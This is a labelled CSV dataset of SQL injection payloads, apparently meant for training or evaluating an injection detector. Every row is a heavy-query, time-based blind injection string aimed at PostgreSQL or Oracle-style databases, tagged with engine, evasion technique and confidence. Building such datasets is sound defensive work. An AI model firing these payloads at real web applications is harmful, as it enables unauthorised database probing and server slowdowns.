payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1' ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'gmil' = 'gmil",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 7240 = 7240",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' in boolean mode ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) #",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ""xcjt"" = ""xcjt",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""dppw"" like ""dppw",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1, ( select ( case when ( 3888 = 3888 ) then ( select count ( * ) from generate_series ( 1,5000000 ) ) else 1/ ( select 0 ) end ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) #",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 5432 = 5432",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'qgov' = 'qgov",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'dhqz' = 'dhqz",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
